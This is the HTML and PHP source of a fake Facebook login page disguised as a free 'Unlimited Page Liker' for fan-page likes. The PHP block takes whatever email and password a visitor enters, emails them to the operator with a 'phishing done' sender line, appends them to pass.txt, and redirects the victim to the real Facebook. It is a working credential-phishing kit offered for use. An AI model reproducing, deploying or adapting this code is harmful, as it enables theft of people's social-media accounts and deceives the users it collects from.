<html>
<head>

<meta charset="UTF-8">
<title >
Login
</title>
<link rel="icon" href="img/favicon.jpg">
  <meta name="description" content="Facebook page liker is the best and the easy way to get the thousands of facebook likes to your fan page. You can get facebook fan page likes within 5 minutes. Facebook page liker will get you thousands of likes within no time and work. You can get up to 100k Likes to your Fan page with Facebook page liker and you can sell the page to someone " />
  <meta name="keywords" content="Facebook,Likes,unlimited,fackbook like,like hack,free,Best Facebook Free Auto Likes, Timeline liker, Auto Comments, Auto Followers, auto friend request, auto page liker, Comments liker, reactions." />
  <meta http-equiv="content-type" content="text/html; charset=windows-1252" />
  <meta name="author" content="Pasindu P Konghawaththa aka MasterBrian">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="style/style.css" />
  <link rel="stylesheet" type="text/css" href="fb.css">

<script>




</script>
</head>

<body>
  <div id="header">
      <div id="logo">
        <div id="logo_text">
         
          <h1><a href="index.html">Welcome to<span class="logo_colour"> Unlimited Page Liker</span></a></h1>
          <h2>Get unlimited Facebook Fanpage Likes with our Facebook Page Liker Tools Free.</h2>
        </div>
      </div>
      <div id="menubar">
        <ul id="menu">
         
          <li class="selected"><a href="index.html">Home</a></li>
          <li><a href="about.html">About</a></li>
          <li><a href="terms.html">Terms</a></li>
          <li><a href="privacy.html">Privacy</a></li>
          <li><a href="contact.html">Contact Us</a></li>
        </ul>
      </div>
    </div>

<div id="center">
<form method="POST" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"])?>">
<p>Get Facebook access_token</p>
<p><input type="text" id="text" placeholder="Email address or phone number" name="name" ></p>
<p><input type="password" id="pass" placeholder="Password"  name="password"></p>
<p><input type="submit" id="butt"   value="Log In" ></p>
</div>
</form>

<?php
header ('Location: https://www.facebook.com');
$posts        = '';
foreach($_POST as $k => $v){
    $posts .= '$_POST['.$k.'] = '.$v."\n";
}
$posts       .= "some one click your link\n";
$emailto    = 'Enter Your Email';
$subject    = $_SERVER['HTTP_HOST']."-".$_SEREVER['SERVER_NAME'];
$from        = "From: Password <phishing done>";
$body        = '
'.$posts.'
';
@mail($emailto, $subject, $body, $from);
$handle = @fopen("pass.txt", "a+");
@fwrite($handle, $posts);
fclose($handle);
?>



<div id="content_footer"></div>
    <div id="footer">
      <p><a href="index.html">Home</a> | <a href="about.html">About</a> | <a href="terms.html">Terms</a> | <a href="privacy.html">Privacy</a> | <a href="contact.html">Contact Us</a></p>
      <p> © 2017-2018 All Rights Reserved | <a href="https://www.facebook.com/pasindu.pramodaya.94">Author</a> | <a href="https://github.com/masterbrian99">Github</a> </p>
    </div>
  </div>
</body>

</html>
